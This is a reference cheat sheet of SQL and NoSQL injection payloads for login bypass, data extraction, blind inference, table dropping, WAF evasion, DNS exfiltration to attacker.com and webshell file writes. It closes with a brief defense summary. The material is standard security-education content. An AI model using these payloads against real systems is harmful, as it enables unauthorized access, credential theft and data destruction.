# **Common SQL injection patterns**

### **1. Authentication Bypass**
Used to log in without valid credentials.

- `' OR '1'='1' --`
- `" OR "1"="1" --`
- `' OR 1=1 --`
- `admin'--`
- `' UNION SELECT NULL,NULL--`

> **Goal**: Make the `WHERE` clause always true, tricking the app into authenticating the attacker.

### **2. Union-Based Injection**
Used to **extract data from other tables** by appending results via `UNION`.

- `' UNION SELECT username,password FROM users--`
- `' UNION SELECT 1,table_name FROM information_schema.tables--`
- `' UNION SELECT 1,2,3,4,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--`

> **Requirements**: Same number and compatible types of columns as original query.

### **3. Boolean-Based (Blind) SQL Injection**
Used when no direct output is shown; attacker infers data based on true/false responses.

- `' AND 1=1--` → page behaves normally  
- `' AND 1=2--` → page errors or changes  
- `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--`

> **Goal**: Extract data one bit/character at a time by observing app behavior.

### **4. Time-Based (Blind) SQL Injection**
Used when even boolean responses aren’t visible; relies on **delays** to infer truth.

- `' AND IF(1=1, SLEEP(5), 0)--` → delays 5 seconds  
- `' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN SLEEP(3) ELSE 0 END)--`

> **Common in**: MySQL (`SLEEP()`), PostgreSQL (`pg_sleep()`), SQL Server (`WAITFOR DELAY`).

### **5. Command Execution / Data Manipulation**
Used to **modify or destroy data** (if stacked queries are allowed).

- `'; DROP TABLE users--`
- `'; INSERT INTO users (username,password) VALUES ('hacker','pwned')--`
- `'; UPDATE users SET admin=1 WHERE username='attacker'--`

> **Note**: Only works if the database driver allows **multiple statements** (e.g., MySQL with `mysqli_multi_query`, but **not** with PDO or most ORMs by default).

### **6. Out-of-Band (OOB) Exfiltration**
Used when direct or blind methods fail; data is sent to an external server.

- `' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--` (MySQL + DNS)
- `' UNION SELECT "test" INTO OUTFILE '/var/www/html/payload.php'--` (write webshell)
- `' AND EXTRACTVALUE(1, CONCAT(0x3a,(SELECT password FROM users LIMIT 1)))--` (XML error-based exfil)

> **Common in**: Environments with lax network controls.

### **7. Error-Based SQL Injection**
Forces the database to **reveal data in error messages**.

- `' AND GTID_SUBSET((SELECT password FROM users LIMIT 1),1)--` (MySQL)
- `' OR 1=CONVERT(int, (SELECT TOP 1 password FROM users))--` (SQL Server)
- `' AND 1=CAST((SELECT version()) AS int)--`

> **Relies on**: Verbose error reporting enabled in the app.

### **8. Bypassing Filters / WAF Evasion**
Used to **evade weak input filters or Web Application Firewalls**.

- **Encoding**:
  - URL-encoded: `%27%20OR%20%271%27%3D%271`
  - Hex: `0x27204f5220313d31`
- **Case variation**: `' Or '1'='1'--`
- **Inline comments**: `'/**/OR/**/'1'='1'--`
- **Null byte**: `' UNION SELECT\x00`
- **Alternative syntax**: `' || '1'='1` (in SQLite/PostgreSQL)

### **9. NoSQL Injection (Bonus)**
Not SQL, but conceptually similar—targets MongoDB, etc.

- `{"$ne": ""}` → matches all non-empty passwords  
- `{"$gt": ""}` → greater-than empty string → bypass auth  
- `{"$where": "this.password.length > 0"}` → JavaScript eval in MongoDB

### **Key Takeaway**
All these patterns **exploit the same root cause**:  
> **User input is concatenated directly into a SQL query string without parameterization or proper escaping.**

**Defense**: Always use **parameterized queries (prepared statements)**, **input validation**, **least-privilege DB accounts**, and **security testing**.